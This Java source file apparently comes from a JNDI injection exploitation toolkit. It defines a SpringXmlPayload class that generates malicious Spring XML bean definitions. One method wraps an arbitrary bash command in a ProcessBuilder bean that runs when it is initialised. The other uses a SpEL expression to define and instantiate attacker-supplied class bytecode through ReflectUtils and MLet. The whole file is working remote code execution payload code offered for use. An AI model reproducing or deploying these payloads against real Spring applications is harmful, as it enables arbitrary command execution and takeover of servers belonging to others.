package map.jndi.payload;

import java.util.Base64;

public class SpringXmlPayload {
    public static String command(String cmd) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\">\n" +
                "        <constructor-arg>\n" +
                "        <list>\n" +
                "            <value>bash</value>\n" +
                "            <value>-c</value>\n" +
                "            <value><![CDATA[" + cmd + "]]></value>\n" +
                "        </list>\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "</beans>";
    }

    public static String loadClass(String className, byte[] byteCode) {
        return "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
                "<beans xmlns=\"http://www.springframework.org/schema/beans\"\n" +
                "    xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n" +
                "    xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\">\n" +
                "    <bean id=\"className\" class=\"java.lang.String\">\n" +
                "        <constructor-arg value=\"" + className + "\">\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "    <bean id=\"byteCode\" class=\"java.lang.String\">\n" +
                "        <constructor-arg value=\"" + Base64.getEncoder().encodeToString(byteCode) + "\">\n" +
                "        </constructor-arg>\n" +
                "    </bean>\n" +
                "    <bean class=\"#{T(org.springframework.cglib.core.ReflectUtils).defineClass(className, T(org.springframework.util.Base64Utils).decodeFromString(byteCode), new javax.management.loading.MLet(new java.net.URL[0], T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()}\">\n" +
                "    </bean>\n" +
                "</beans>";
    }
}
